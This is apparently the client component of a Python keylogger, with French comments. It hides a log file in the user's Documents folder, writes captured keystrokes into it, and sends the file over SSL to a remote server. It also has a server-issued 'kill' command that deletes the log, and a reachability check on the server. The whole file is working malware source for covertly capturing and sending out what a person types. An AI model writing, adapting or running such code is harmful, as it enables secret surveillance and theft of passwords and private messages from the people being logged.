import platform, os, ctypes, socket, ssl, time, ping3

# Fonction création simple du fichier
def creation_fichier(nom_fichier, sys):
    if sys == "Linux":
        # Créer un fichier cacher dans le dossier Document de l'utilisateur
        try:
            path = "/home/%s/Documents/.%s" %(os.getlogin(), nom_fichier)
            open(path, "w")
            return path
        except Exception as e:
            print(f"Erreur lors de la création de %s : {e}" %(nom_fichier))
    elif sys == "Windows":
        # Créer un fichier cacher dans le dossier Document de l'utilisateur
        try:
            path = "C:\\Users\\%s\\Documents\\%s" %(os.getlogin(), nom_fichier)
            open(path, "w")
            ctypes.windll.kernel32.SetFileAttributesW(path, 2)
            return path
        except Exception as e:
            print(f"Erreur lors de la création de %s : {e}" %(nom_fichier))
    else:
        pass

# Fonction suppression du fichier
def suppression_fichier(file_path):
    try:
        # Supprimer le fichier
        os.remove(file_path)
    except Exception as e:
        print(f"Erreur lors de la suppression du fichier : {e}")

# Fonction pour écrire les frappes dans le fichier
def touche_fichier(file_path, event):
    try:
        # Récupère la touche pressée
        key = event.name

        # Ouvre le fichier en mode ajout
        with open(file_path, "a", encoding="utf-8") as f:
            if key == "space":
                f.write(" ")
            elif key == "enter":
                f.write("\n")
            elif key == "backspace":
                # Aller à la fin du fichier et reculer d'un caractère
                f.seek(0, 2)
                f.seek(f.tell() - 1, 0)
                # Tronquer le fichier d'un caractère
                f.truncate()
            elif key == "maj" or key == "caps lock" or key == "shift" or key == "alt gr" or key == "tab" or key == "esc":
                pass
            else:
                f.write(key)

    except AttributeError:
        # Ignore les touches non valides (comme les touches de fonction)
        pass

# Fonction de détection d'OS
def detect_os():
    if "Linux" in platform.uname():
        return "Linux"
    elif "Windows" in platform.uname():
        return "Windows"
    else :
        return "Other"

# Fonction de client
def client(file_path, ip_server, port):
    # Paramètres du serveur
    server_address = (ip_server, port)

    # Création du socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Création du socket SSL
    client_ssl = ssl.wrap_socket(client_socket,ca_certs="certificat.pem")

    try :
        # Connecter ssl
        client_ssl.connect(server_address)

        # Arrêter le programme et supprimer le fichier si l'option -k est utilisée
        command = client_ssl.recv(1024)
        if command == "kill":
            kill(file_path)

        # Ouvrir le fichier en mode lecture binaire
        with open(file_path, "rb") as f:
            # Lire les données du fichier
            data = f.read(1024)
            while data:
                # Envoyer les données au serveur
                client_ssl.send(data)
                # Lire les données du fichier
                data = f.read(1024)

        # Fermer la connexion
        client_ssl.close()
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier : {e}")

# La fonction de ping du serveur
def ping(ip_server):
    while True:
        if ping3.ping(ip_server) == None:
            time.sleep(10)
            if ping3.ping(ip_server) == None:
                print("Le serveur n'est pas joignable, arrêt du programme")
                exit()
        else:
            time.sleep(10)

# Fonction si réception de la commande kill
def kill(file_path):
    # Arrêter le programme et supprimer le fichier
    os.remove(file_path)
    print("Le programme a été arrêté et le fichier supprimé !")
    exit()

# Fonction de connexion au serveur
def connexion(ip_server, port, resultat):
    # Paramètres du serveur
    server_address = (ip_server, port)

    # Création du socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Création du socket SSL
    client_ssl = ssl.wrap_socket(client_socket,ca_certs="certificat.pem")

    # Essayer de se connecter au serveur. S'il est toujours injoignable au bout de 10 minutes, le programme s'arrête
    try:
        # Connexion ssl
        client_ssl.connect(server_address)
    except Exception as e:
        print(f"Erreur lors de la connexion au serveur : {e}")
        time.sleep(10)
        try : 
            client_ssl.connect(server_address)
        except Exception as e:
            print("Le serveur n'est pas joignable, arrêt du programme")
            # retourner resultat
            resultat.put("exit")